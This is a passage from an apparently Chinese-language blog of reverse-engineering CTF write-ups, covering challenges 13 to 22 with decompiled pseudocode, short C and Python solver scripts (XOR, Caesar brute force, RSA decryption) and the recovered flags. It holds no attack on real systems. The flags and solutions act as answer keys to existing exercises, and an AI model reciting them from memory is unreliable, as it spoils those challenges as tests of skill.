&#39;q&#39;, &#39;@&#39;, &#39;g&#39;, &#39;j&#39;, &#39;z&#39;, &#39;&#123;&#39;, &#39;z&#39;, &#39;@&#39;, &#39;w&#39;, &#39;z&#39;, &#39;q&#39;, &#39;W&#39;, &#39;~&#39;, &#39;/&#39;, &#39;b&#39;, &#39;;&#39;&#125;;    for(i=0;i&lt;33;i++)    &#123;        a[i]=a[i]^0x1f;        printf(&quot;%c&quot;,a[i]);    &#125;&#125; </code></pre><p>得到 flag：BJD{jack_de_hu1b1an_xuede_henHa0}</p><h3 id="13-GKCTF2020-Check-1n"><a href="#13-GKCTF2020-Check-1n" class="headerlink" title="13.[GKCTF2020]Check_1n"></a>13.[GKCTF2020]Check_1n</h3><p>这道题，首先明确一点，这是签到题，所以不会太难</p><p>先运行出来，发现是一个用c++写的一个代码电脑文件</p><pre><code>↑ ↓ ← → 空格    进行操作</code></pre><p>先开机，发现需要密码，打开ida，看字符串。<br><img src="https://i.loli.net/2020/12/04/EsDbhZI2LOXc9Yo.png"><br>开机后发现有几个文件，其中有一个叫flag，打开<br><img src="https://i.loli.net/2020/12/04/EC6vOHNWlI4Tgoj.png"><br>发现<br><img src="https://i.loli.net/2020/12/04/HVFQe5Yas9T7RjD.png"><br>解码内容为</p><pre><code>Why don&#39;t you try the magic brick game你为什么不试试魔法砖游戏</code></pre><p>然后去玩魔法砖游戏<br><img src="https://i.loli.net/2020/12/04/p49BTOFKwjWnHCo.png"><br><img src="https://i.loli.net/2020/12/04/F9hGRyxNvgaOPuH.png"><br>得到flag{f5dfd0f5-0343-4642-8f28-9adbb74c4ede}回头看看这<br><img src="https://i.loli.net/2020/12/04/RBQA4PktCTzs1hb.png"></p><h3 id="14-findit"><a href="#14-findit" class="headerlink" title="14.findit"></a>14.findit</h3><p>下载下来发现是个apk文件，用jeb打开。<br><img src="https://i.loli.net/2020/12/04/zRdCLm1tkaNJTHr.png"><br>发现重要线索</p><pre><code> this.findViewById(0x7F05003D).setOnClickListener(new View$OnClickListener(new char[]&#123;&#39;T&#39;, &#39;h&#39;, &#39;i&#39;, &#39;s&#39;, &#39;I&#39;, &#39;s&#39;, &#39;T&#39;, &#39;h&#39;, &#39;e&#39;, &#39;F&#39;, &#39;l&#39;, &#39;a&#39;, &#39;g&#39;, &#39;H&#39;, &#39;o&#39;, &#39;m&#39;, &#39;e&#39;&#125;, this.findViewById(0x7F05003E), new char[]&#123;&#39;p&#39;, &#39;v&#39;, &#39;k&#39;, &#39;q&#39;, &#39;&#123;&#39;, &#39;m&#39;, &#39;1&#39;, &#39;6&#39;, &#39;4&#39;, &#39;6&#39;, &#39;7&#39;, &#39;5&#39;, &#39;2&#39;, &#39;6&#39;, &#39;2&#39;, &#39;0&#39;, &#39;3&#39;, &#39;3&#39;, &#39;l&#39;, &#39;4&#39;, &#39;m&#39;, &#39;4&#39;, &#39;9&#39;, &#39;l&#39;, &#39;n&#39;, &#39;p&#39;, &#39;7&#39;, &#39;p&#39;, &#39;9&#39;, &#39;m&#39;, &#39;n&#39;, &#39;k&#39;, &#39;2&#39;, &#39;8&#39;, &#39;k&#39;, &#39;7&#39;, &#39;5&#39;, &#39;&#125;&#39;&#125;, this.findViewById(0x7F05003F))</code></pre><p>提取有用信息</p><pre><code>p v k q &#123; m 1 6 4 6 7 5 2 6 2 0 3 3 l 4 m 4 9 l n p 7 p 9 m n k 2 8 k 7 5 &#125; //实际上将apk文件解压，然后将文件classes.dex后缀改为txt，搜索‘&#123;’也可以得到这个</code></pre><p>分析jeb代码，发现好像和凯撒加密有一些关系，直接暴力破解，脚本如下</p><pre><code>#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;int main(void)&#123;    char table1[27]=&quot;abcdefghijklmnopqrstuvwxyz&quot;;    char table2[27]=&quot;ABCDEFJHIJKLMNOPQRSTUVWXYZ&quot;;    char str1[100]=&quot;pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;&quot;;    char str2[100]=&quot;&quot;;    int i,k,len;    len=strlen(str1);    for(k=0;k&lt;26;k++)    &#123;        for(i=0;i&lt;len;i++)        &#123;            if(str1[i]&gt;=table1[k]&amp;&amp;str1[i]&lt;=&#39;z&#39;)            &#123;                str2[i]=str1[i]-k;            &#125;            else if(str1[i]&lt;table1[k]&amp;&amp;str1[i]&gt;=&#39;a&#39;)            &#123;                str2[i]=str1[i]+26-k;            &#125;            else if(str1[i]&gt;=table2[k]&amp;&amp;str1[i]&lt;=&#39;Z&#39;)            &#123;                str2[i]=str1[i]-k;            &#125;            else if(str1[i]&lt;table2[k]&amp;&amp;str1[i]&gt;=&#39;A&#39;)            &#123;                str2[i]=str1[i]+26-k;            &#125;                        else            &#123;                str2[i]=str1[i];            &#125;        &#125;        printf(&quot;%s&quot;,str2);        printf(&quot;\n&quot;);    &#125; &#125; </code></pre><p>得到</p><pre><code>pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;oujp&#123;l164675262033k4l49kmo7o9lmj28j75&#125;ntio&#123;k164675262033j4k49jln7n9kli28i75&#125;mshn&#123;j164675262033i4j49ikm7m9jkh28h75&#125;lrgm&#123;i164675262033h4i49hjl7l9ijg28g75&#125;kqfl&#123;h164675262033g4h49gik7k9hif28f75&#125;jpek&#123;g164675262033f4g49fhj7j9ghe28e75&#125;iodj&#123;f164675262033e4f49egi7i9fgd28d75&#125;hnci&#123;e164675262033d4e49dfh7h9efc28c75&#125;gmbh&#123;d164675262033c4d49ceg7g9deb28b75&#125;flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;//这个就是flagekzf&#123;b164675262033a4b49ace7e9bcz28z75&#125;djye&#123;a164675262033z4a49zbd7d9aby28y75&#125;cixd&#123;z164675262033y4z49yac7c9zax28x75&#125;bhwc&#123;y164675262033x4y49xzb7b9yzw28w75&#125;agvb&#123;x164675262033w4x49wya7a9xyv28v75&#125;zfua&#123;w164675262033v4w49vxz7z9wxu28u75&#125;yetz&#123;v164675262033u4v49uwy7y9vwt28t75&#125;xdsy&#123;u164675262033t4u49tvx7x9uvs28s75&#125;wcrx&#123;t164675262033s4t49suw7w9tur28r75&#125;vbqw&#123;s164675262033r4s49rtv7v9stq28q75&#125;uapv&#123;r164675262033q4r49qsu7u9rsp28p75&#125;tzou&#123;q164675262033p4q49prt7t9qro28o75&#125;synt&#123;p164675262033o4p49oqs7s9pqn28n75&#125;rxms&#123;o164675262033n4o49npr7r9opm28m75&#125;qwlr&#123;n164675262033m4n49moq7q9nol28l75&#125;</code></pre><p>也可以根据前几个字母，先算出位移量，到网上去在线解密。</p><h3 id="15-GXYCTF2019-luck-guy"><a href="#15-GXYCTF2019-luck-guy" class="headerlink" title="15.[GXYCTF2019]luck_guy"></a>15.[GXYCTF2019]luck_guy</h3><p>自己ida打开，找到关键代码，找的过程就不说了</p><pre><code>unsigned __int64 get_flag()&#123;  unsigned int v0; // eax  char v1; // al  signed int i; // [rsp+4h] [rbp-3Ch]  signed int j; // [rsp+8h] [rbp-38h]  __int64 s; // [rsp+10h] [rbp-30h]  char v6; // [rsp+18h] [rbp-28h]  unsigned __int64 v7; // [rsp+38h] [rbp-8h]  v7 = __readfsqword(40u);  v0 = time(0LL);  srand(v0);  for ( i = 0; i &lt;= 4; ++i )  &#123;    switch ( rand() % 200 )//就是随机取数了，所以叫luck_guy,实际上有用的case也就1，4，5。    &#123;      case 1:        puts(&quot;OK, it&#39;s flag:&quot;);        memset(&amp;s, 0, 0x28uLL);                 // 将s0清0        strcat((char *)&amp;s, f1);                 // f1=&#39;GXY&#123;do_not_&#39;        strcat((char *)&amp;s, &amp;f2);                // f2是剩下的那一半flag        printf(&quot;%s&quot;, &amp;s);        break;      case 2:        printf(&quot;Solar not like you&quot;);        break;      case 3:        printf(&quot;Solar want a girlfriend&quot;);        break;      case 4:        v6 = 0;        s = &#39;fo`guci&#39;;        strcat(&amp;f2, (const char *)&amp;s);//将s给f2，注意要反序。        break;      case 5://就一个将f2的加密过程，算出来的f2就是另一半flag。        for ( j = 0; j &lt;= 7; ++j )        &#123;          if ( j % 2 == 1 )            v1 = *(&amp;f2 + j) - 2;          else            v1 = *(&amp;f2 + j) - 1;          *(&amp;f2 + j) = v1;        &#125;        break;      default:        puts(&quot;emmm,you can&#39;t find flag 23333&quot;);        break;    &#125;  &#125;  return __readfsqword(0x28u) ^ v7;&#125;</code></pre><p>根据分析，写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int i;    char a[]=&#123;&#39;i&#39;, &#39;c&#39;, &#39;u&#39;, &#39;g&#39;, &#39;`&#39;, &#39;o&#39;, &#39;f&#39;, &#39;\x7f&#39;&#125;;    for(i=0;i&lt;=7;i++)    &#123;        if (i%2==1)            a[i]=a[i]-2;        else            a[i]=a[i]-1;        printf(&quot;%c&quot;,a[i]);     &#125;  &#125;</code></pre><p>得到f2：hate_me} 和f1拼起来，得到GXY{do_not_hate_me}</p><h3 id="16-简单注册器"><a href="#16-简单注册器" class="headerlink" title="16.简单注册器"></a>16.简单注册器</h3><p>下载下来是个apk文件，jeb打开，与14题一样操作，得到重要代码。<br><img src="https://i.loli.net/2020/12/04/EesntdU2ZrRpiLY.png"><br>根据分析写出脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int m=0x1f,n=2,i=0,j;    char a[33]=&quot;dd2940c04462b4dd7c450528835cca15&quot;;    a[n] = ((char)(a[n] + a[3] - 50));    a[4] = ((char)(a[n] + a[5] - 0x30));    a[30] = ((char)(a[m] + a[9] - 0x30));    a[14] = ((char)(a[27] + a[28] - 97));    for(i=0;i&lt;16;i++)    &#123;        j=a[0x1f-i];        a[0x1f-i]=a[i];        a[i]=j;    &#125;    printf(&quot;%s&quot;,a); &#125; </code></pre><p>得到59acc538825054c7de4b26440c0999dd</p><p>所以flag{59acc538825054c7de4b26440c0999dd}</p><h3 id="17-GWCTF-2019-pyre"><a href="#17-GWCTF-2019-pyre" class="headerlink" title="17.[GWCTF 2019]pyre"></a>17.[GWCTF 2019]pyre</h3><p>看题目，pyre，说明是python文件，下载下来是pyc，先反编译为py文件，在cmd里面输入命令(我11届极客大挑战的文章中中有也有一道题是反编译pyc文件)</p><pre><code>C:\Users\hp&gt;uncompyle6 -o C:\Users\hp\Downloads\attachment.py C:\Users\hp\Downloads\attachment.pycC:\Users\hp\Downloads\attachment.pyc --# Successfully decompiled file</code></pre><p>出现Successfully则表示成功。用python的IDLE打开这个py文件，得到源码，如下</p><pre><code>print &#39;Welcome to Re World!&#39;print &#39;Your input1 is your flag~&#39;l = len(input1)for i in range(l)://第一次for循环加密，注意i和1的区别，我就是因为把i看作了1，做了很久。    num = ((input1[i] + i) % 128 + 128) % 128    code += num//注意这一句，和c不太一样，它的意思是用num的值来填充code。for i in range(l - 1)://第二个加密，就是数组内异或。    code[i] = code[i] ^ code[(i + 1)]print codecode = [&#39;\x1f&#39;, &#39;\x12&#39;, &#39;\x1d&#39;, &#39;(&#39;, &#39;0&#39;, &#39;4&#39;, &#39;\x01&#39;, &#39;\x06&#39;, &#39;\x14&#39;, &#39;4&#39;, &#39;,&#39;, &#39;\x1b&#39;, &#39;U&#39;, &#39;?&#39;, &#39;o&#39;, &#39;6&#39;, &#39;*&#39;, &#39;:&#39;, &#39;\x01&#39;, &#39;D&#39;, &#39;;&#39;, &#39;%&#39;, &#39;\x13&#39;]</code></pre><p>写出脚本</p><pre><code>#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;int main(void)&#123;    int i,len;    char code[23]=&#123;&#39;\x1f&#39;, &#39;\x12&#39;, &#39;\x1d&#39;, &#39;(&#39;, &#39;0&#39;, &#39;4&#39;, &#39;\x01&#39;, &#39;\x06&#39;, &#39;\x14&#39;, &#39;4&#39;, &#39;,&#39;, &#39;\x1b&#39;, &#39;U&#39;, &#39;?&#39;, &#39;o&#39;, &#39;6&#39;, &#39;*&#39;, &#39;:&#39;, &#39;\x01&#39;, &#39;D&#39;, &#39;;&#39;, &#39;%&#39;, &#39;\x13&#39;&#125;;    len=strlen(code);    printf(&quot;%d&quot;,len);    printf(&quot;\n&quot;);    for(i=len-2;i!=-1;i--)//数组内异或解密    &#123;        code[i]=code[i]^code[i+1];    &#125;    for(i=0;i!=len;i++)    &#123;        code[i]=code[i]-i;//这时候的一些code[i]的十进制值是负数        if(code[i]&lt;0)//注意这个if条件，保证flag内字符的值在64~127内。        &#123;            code[i]+=128;        &#125;        printf(&quot;%c&quot;,code[i]);    &#125; &#125; </code></pre><p>得到flag：GWHT{Just_Re_1s_Ha66y!}</p><h3 id="18-rsa"><a href="#18-rsa" class="headerlink" title="18.rsa"></a>18.rsa</h3><p>首先了解rsa是什么。<br><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a><br><a href="https://zhuanlan.zhihu.com/p/44185847?utm_source=wechat_session">https://zhuanlan.zhihu.com/p/44185847?utm_source=wechat_session</a></p><p>下载下来得到两个文件，一个文件是flag，一个是公钥。</p><p>用公钥在线分析网站，分解公钥<br><a href="http://tool.chacuo.net/cryptrsakeyparse/">http://tool.chacuo.net/cryptrsakeyparse/</a>，也可以用Linux的kali来分解公钥(某位大佬的博客<a href="https://www.cnblogs.com/jane315/p/13175850.html">https://www.cnblogs.com/jane315/p/13175850.html</a>)<br>得到</p><pre><code>n=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDe=65537 (0x10001)</code></pre><p>用Python将n转化为十进制</p><pre><code>&gt;&gt;&gt; a=int(&#39;C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD&#39;,16)&gt;&gt;&gt; print(a)86934482296048119190666062003494800588905656017203025617216654058378322103517得到n=86934482296048119190666062003494800588905656017203025617216654058378322103517</code></pre><p>在继续分解n得到p，q。网站：<a href="http://factordb.com/">http://factordb.com/</a>得到</p><pre><code>p=285960468890451637935629440372639283459q=304008741604601924494328155975272418463</code></pre><p>然后写脚本，这里是直接用的别人的，需要注意的是需要安装两个库。</p><pre><code>import gmpy2import rsae=65537n=86934482296048119190666062003494800588905656017203025617216654058378322103517p=285960468890451637935629440372639283459q=304008741604601924494328155975272418463phin = (p-1) * (q-1)d=gmpy2.invert(e, phin)key=rsa.PrivateKey(n,e,int(d),p,q)with open(&quot;flag.enc&quot;,&quot;rb&quot;) as f://这里是打开那个flag.net文件    f=f.read()    print(rsa.decrypt(f,key))</code></pre><p>得到flag{decrypt_256}</p><h3 id="19-JustRE"><a href="#19-JustRE" class="headerlink" title="19.JustRE"></a>19.JustRE</h3><p>文件下载下来，打开发现<br><img src="https://i.loli.net/2020/12/11/6ultd1rOk4hs87B.png"><br>说是要你一直点就会出flag。不过它说的还真是真的。<br><img src="https://i.loli.net/2020/12/11/WA2Sbl9ajVodMJk.png"><br>正确解法，放到ida里面，shift +12。<br><img src="https://i.loli.net/2020/12/11/ob3J5ufAgTjIXvW.png"><br>找到其所在函数，f5看伪代码。<br><img src="https://i.loli.net/2020/12/11/8P7SMwOEnGHXzfo.png"><br>不知道sprintf的意思，网上搜一搜，<a href="https://blog.csdn.net/wangkeyen/article/details/81942918">https://blog.csdn.net/wangkeyen/article/details/81942918</a></p><pre><code>aBjdDD2069a4579就是BJD&#123;%d%d2069a45792d233ac&#125;而 sprintf(&amp;String, aBjdDD2069a4579, 19999, 0);就是要你把19999，0分别是那两个%d</code></pre><p>得到flag{1999902069a45792d233ac}</p><h3 id="20-2019红帽杯-easyRE"><a href="#20-2019红帽杯-easyRE" class="headerlink" title="20.[2019红帽杯]easyRE"></a>20.[2019红帽杯]easyRE</h3><p>下载文件用ida打开，shift+12；<br><img src="https://i.loli.net/2020/12/11/e1Zowna3kmUCTYL.png"><br>找到重要代码</p><pre><code>  unsigned __int64 v54; // [rsp+108h] [rbp-18h]  v54 = __readfsqword(0x28u);  v12 = 73;  v13 = 111;  v14 = 100;  v15 = 108;  v16 = 62;  v17 = 81;  v18 = 110;  v19 = 98;  v20 = 40;  v21 = 111;  v22 = 99;  v23 = 121;  v24 = 127;  v25 = 121;  v26 = 46;  v27 = 105;  v28 = 127;  v29 = 100;  v30 = 96;  v31 = 51;  v32 = 119;  v33 = 125;  v34 = 119;  v35 = 101;  v36 = 107;  v37 = 57;  v38 = 123;  v39 = 105;  v40 = 121;  v41 = 61;  v42 = 126;  v43 = 121;  v44 = 76;  v45 = 64;  v46 = 69;  v47 = 67;  memset(v48, 0, sizeof(v48));  v49 = 0;  v50 = 0;  sub_4406E0(0LL, v48, 37LL);  v50 = 0;  if ( sub_424BA0(v48) == 36 )  &#123;    for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i )    &#123;      if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) )//v48是自己输入的，*(&amp;v12 + i)就相当于一个数组，从v12到v47，一共36个数。简单的异或。      &#123;        result = 4294967294LL;        goto LABEL_13;      &#125;    &#125;    sub_410CC0(&quot;continue!&quot;);    memset(&amp;v51, 0, 0x40uLL);    v53 = 0;    sub_4406E0(0LL, &amp;v51, 64LL);    v52 = 0;    if ( sub_424BA0(&amp;v51) == 39 )    &#123;      v1 = sub_400E44(&amp;v51);      v2 = sub_400E44(v1);      v3 = sub_400E44(v2);      v4 = sub_400E44(v3);      v5 = sub_400E44(v4);      v6 = sub_400E44(v5);      v7 = sub_400E44(v6);      v8 = sub_400E44(v7);      v9 = sub_400E44(v8);      v10 = sub_400E44(v9);      if ( !(unsigned int)sub_400360(v10, off_6CC090) )      &#123;        sub_410CC0(&quot;You found me!!!&quot;);        sub_410CC0(&quot;bye bye~&quot;);      &#125;      result = 0LL;    &#125;    else    &#123;      result = 4294967293LL;    &#125;  &#125;  else  &#123;    result = 0xFFFFFFFFLL;  &#125;LABEL_13:  if ( __readfsqword(0x28u) != v54 )    sub_444020();  return result;&#125;</code></pre><p>先看这一部分</p><pre><code>if ( sub_424BA0(v48) == 36 )  &#123;    for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i )    &#123;      if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) )//v48是自己输入的，*(&amp;v12 + i)就相当于一个数组，从v12到v47，一共36个数。简单的异或。      &#123;        result = 4294967294LL;        goto LABEL_13;      &#125;    &#125;</code></pre><p>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[36]=&#123;73,111,100,108,62,81,110,98,40,111,99,121,127,121,46,105,127,100,96,51,119,125,119,101,107,57,123,105,121,61,126,121,76,64,69,67&#125;;         int i;    for(i=0;i&lt;36;i++)    &#123;        a[i]=a[i]^i;        printf(&quot;%c&quot;,a[i]);     &#125; &#125; </code></pre><p>得到<br><img src="https://i.loli.net/2020/12/11/9zfNW3A4sLdRIbn.png"><br>它说：前四个字符是“flag”，现在还不知道意思。</p><p>继续看</p><pre><code>    memset(&amp;v51, 0, 0x40uLL);//定义了一个数组叫v51    v53 = 0;    sub_4406E0(0LL, &amp;v51, 64LL);    v52 = 0;    if ( sub_424BA0(&amp;v51) == 39 )//v61长度是39    &#123;      v1 = sub_400E44(&amp;v51);//对v51base64编码      v2 = sub_400E44(v1);//对v1base64编码      v3 = sub_400E44(v2);      v4 = sub_400E44(v3);      v5 = sub_400E44(v4);      v6 = sub_400E44(v5);      v7 = sub_400E44(v6);      v8 = sub_400E44(v7);      v9 = sub_400E44(v8);      v10 = sub_400E44(v9);      if ( !(unsigned int)sub_400360(v10, off_6CC090) )将v10和off_6CC090对比。      &#123;        sub_410CC0(&quot;You found me!!!&quot;);        sub_410CC0(&quot;bye bye~&quot;);      &#125;</code></pre><p>整个过程就是一个不断base64编码的过程，进行了10次，得到了off_6CC090，也就是</p><pre><code>Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==</code></pre><p>直接网上解码10次，发现是<a href="https://bbs.pediy.com/thread-254172.htm">https://bbs.pediy.com/thread-254172.htm</a>，居然是一个网站。。。。无情被欺骗。最后通过看wp，发现真正的算法在<br><img src="https://i.loli.net/2020/12/11/8SeKL1W6wEzcDyo.png"><br>得到代码</p><pre><code>unsigned __int64 __fastcall sub_400D35(__int64 a1, __int64 a2)&#123;  __int64 v2; // rdx  __int64 v3; // rdx  __int64 v4; // rdx  unsigned __int64 result; // rax  unsigned __int64 v6; // rt1  unsigned int v7; // [rsp+Ch] [rbp-24h]  signed int i; // [rsp+10h] [rbp-20h]  signed int j; // [rsp+14h] [rbp-1Ch]  unsigned int v10; // [rsp+24h] [rbp-Ch]  unsigned __int64 v11; // [rsp+28h] [rbp-8h]  v11 = __readfsqword(0x28u);  v7 = sub_43FD20() - qword_6CEE38;  for ( i = 0; i &lt;= &#39;\x04�&#39;; ++i )  &#123;    sub_40F790(v7);    sub_40FE60(v7, a2, v2);    sub_40FE60(v7, a2, v3);    v7 = (unsigned __int64)sub_40FE60(v7, a2, v4) ^ 2557891634;  &#125;  v10 = v7;  if ( ((unsigned __int8)v7 ^ byte_6CC0A0[0]) == &#39;f&#39; &amp;&amp; (HIBYTE(v10) ^ (unsigned __int8)byte_6CC0A3) == &#39;g&#39; )//这里的f和g是不是有点熟悉，再联系一下前面的提示：前四个字符是“flag”，通过这个来求key。  &#123;    for ( j = 0; j &lt;= 24; ++j )      sub_410E90((unsigned __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v10 + j % 4)));//加密算法，key实际上就是那个v10，通过j % 4，又可以知道，v10只有4个。  &#125;  v6 = __readfsqword(0x28u);  result = v6 ^ v11;  if ( v6 != v11 )    sub_444020();  return result;&#125;</code></pre><p>byte_6CC0A0[25]={0x40,0x35,0x20,0x56,0x5d,0x18,0x22,0x45,0x17,0x2f,0x24,0x6e,0x62,0x3c,0x27,0x54,0x48,0x6c,0x24,0x6e,0x72,0x3c,0x32,0x45,0x5b};</p><p>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[36]=&#123;73,111,100,108,62,81,110,98,40,111,99,121,127,121,46,105,127,100,96,51,119,125,119,101,107,57,123,105,121,61,126,121,76,64,69,67&#125;;     int key[4]=&#123;&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;&#125; ;    int byte_6CC0A0[25]=&#123;0x40,0x35,0x20,0x56,0x5d,0x18,0x22,0x45,0x17,0x2f,0x24,0x6e,0x62,0x3c,0x27,0x54,0x48,0x6c,0x24,0x6e,0x72,0x3c,0x32,0x45,0x5b&#125;;    int i,j;    for(i=0;i&lt;36;i++)    &#123;        a[i]=a[i]^i;        printf(&quot;%c&quot;,a[i]);     &#125;    printf(&quot;\n&quot;);     for(i=0;i&lt;4;i++)//通过前4个字符，也就是flag，求出key。    &#123;        key[i]=key[i]^byte_6CC0A0[i];    &#125;    for(j=0;j&lt;25;j++)//用key来解密。    &#123;        byte_6CC0A0[j]=byte_6CC0A0[j]^key[j%4];        printf(&quot;%c&quot;,byte_6CC0A0[j]);    &#125; &#125; </code></pre><p>得到flag{Act1ve_Defen5e_Test}</p><h3 id="21-ACTF新生赛2020-easyre"><a href="#21-ACTF新生赛2020-easyre" class="headerlink" title="21.[ACTF新生赛2020]easyre"></a>21.[ACTF新生赛2020]easyre</h3><p>下载下来用PEID打开，发现是upx加壳的文件<br><img src="https://i.loli.net/2020/12/12/3FfUPVaYK1ke9ux.png"><br>由于前面已经介绍过upx解壳了，就不写过程了。</p><p>然后将文件拖入ida，shift+12，ctrl+x，一套操作。得到关键代码</p><pre><code>  __main();  v4 = 42;  v5 = 70;  v6 = 39;  v7 = 34;  v8 = 78;  v9 = 44;  v10 = 34;  v11 = 40;  v12 = 73;  v13 = 63;  v14 = 43;  v15 = 64;//一个长度为12的数组。  printf(&quot;Please input:&quot;);  scanf(&quot;%s&quot;, &amp;v19);  if ( v19 != &#39;A&#39; || v20 != &#39;C&#39; || v21 != &#39;T&#39; || v22 != &#39;F&#39; || v23 != &#39;&#123;&#39; || v27 != &#39;&#125;&#39; )//这里是r键过后的，从这可以知道v24~v26是我们需要的东西    return 0;  v16 = v24;  v17 = v25;  v18 = v26;  for ( i = 0; i &lt;= 11; ++i )  &#123;    if ( *(&amp;v4 + i) != _data_start__[*((char *)&amp;v16 + i) - 1] )// _data_start_是一个表，类似于base64编码表。*((char *)&amp;v16 + i)是ACTF&#123;&#125;大括号中的内容。只不过这里我也有点疑惑，不应该只有3个吗。      return 0;  &#125;  printf(&quot;You are correct!&quot;);  return 0;&#125;</code></pre><p>写出脚本，这个脚本体现了一个从一个字符串中找某个字符的思想</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[120]=&#123;&#39;~&#39;, &#39;&#125;&#39;, &#39;|&#39;, &#39;&#123;&#39;, &#39;z&#39;, &#39;y&#39;, &#39;x&#39;, &#39;w&#39;, &#39;v&#39;, &#39;u&#39;, &#39;t&#39;, &#39;s&#39;, &#39;r&#39;, &#39;q&#39;, &#39;p&#39;, &#39;o&#39;, &#39;n&#39;, &#39;m&#39;, &#39;l&#39;, &#39;k&#39;, &#39;j&#39;, &#39;i&#39;, &#39;h&#39;, &#39;g&#39;, &#39;f&#39;, &#39;e&#39;, &#39;d&#39;, &#39;c&#39;, &#39;b&#39;, &#39;a&#39;, &#39;`&#39;, &#39;_&#39;, &#39;^&#39;, &#39;]&#39;, &#39;\\&#39;, &#39;[&#39;, &#39;Z&#39;, &#39;Y&#39;, &#39;X&#39;, &#39;W&#39;, &#39;V&#39;, &#39;U&#39;, &#39;T&#39;, &#39;S&#39;, &#39;R&#39;, &#39;Q&#39;, &#39;P&#39;, &#39;O&#39;, &#39;N&#39;, &#39;M&#39;, &#39;L&#39;, &#39;K&#39;, &#39;J&#39;, &#39;I&#39;, &#39;H&#39;, &#39;G&#39;, &#39;F&#39;, &#39;E&#39;, &#39;D&#39;, &#39;C&#39;, &#39;B&#39;, &#39;A&#39;, &#39;@&#39;, &#39;?&#39;, &#39;&gt;&#39;, &#39;=&#39;, &#39;&lt;&#39;, &#39;;&#39;, &#39;:&#39;, &#39;9&#39;, &#39;8&#39;, &#39;7&#39;, &#39;6&#39;, &#39;5&#39;, &#39;4&#39;, &#39;3&#39;, &#39;2&#39;, &#39;1&#39;, &#39;0&#39;, &#39;/&#39;, &#39;.&#39;, &#39;-&#39;, &#39;,&#39;, &#39;+&#39;, &#39;*&#39;, &#39;)&#39;, &#39;(&#39;,0x27, &#39;&amp;&#39;, &#39;%&#39;, &#39;$&#39;, &#39;#&#39;, &#39; &#39;, &#39;!&#39;, &#39;&quot;&#39;&#125;;//a就是那个_data_start__    int v4[12]=&#123;42,70,39,34,78,44,34,40,73,63,43,64&#125;;    int i,j;    for(i=0;i&lt;12;i++)    &#123;        for(j=0;j&lt;=120;j++)        &#123;            if(v4[i]==a[j])            &#123;                printf(&quot;%c&quot;,j+1);//这个j+1是因为_data_start__[*((char *)&amp;v16 + i) - 1]中的-1                break;            &#125;        &#125;    &#125;&#125;</code></pre><p>得到flag{U9X_1S_W6@T?}</p><h3 id="22-SUCTF2019-SignIn"><a href="#22-SUCTF2019-SignIn" class="headerlink" title="22.[SUCTF2019]SignIn"></a>22.[SUCTF2019]SignIn</h3><p>文件下载下来直接用ida打开，一套操作找到关键代码</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char v4; // [rsp+0h] [rbp-4A0h]  char v5; // [rsp+10h] [rbp-490h]  char v6; // [rsp+20h] [rbp-480h]  char v7; // [rsp+30h] [rbp-470h]  char v8; // [rsp+40h] [rbp-460h]  char v9; // [rsp+B0h] [rbp-3F0h]  unsigned __int64 v10; // [rsp+498h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts(&quot;[sign in]&quot;);  printf(&quot;[input your flag]: &quot;, a2);  __isoc99_scanf(&quot;%99s&quot;, &amp;v8);  sub_96A(&amp;v8, &amp;v9);  __gmpz_init_set_str(&amp;v7, &quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);  __gmpz_init_set_str(&amp;v6, &amp;v9, 16LL);  __gmpz_init_set_str(&amp;v4, &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;, 10LL);  __gmpz_init_set_str(&amp;v5, &quot;65537&quot;, 10LL);  __gmpz_powm(&amp;v6, &amp;v6, 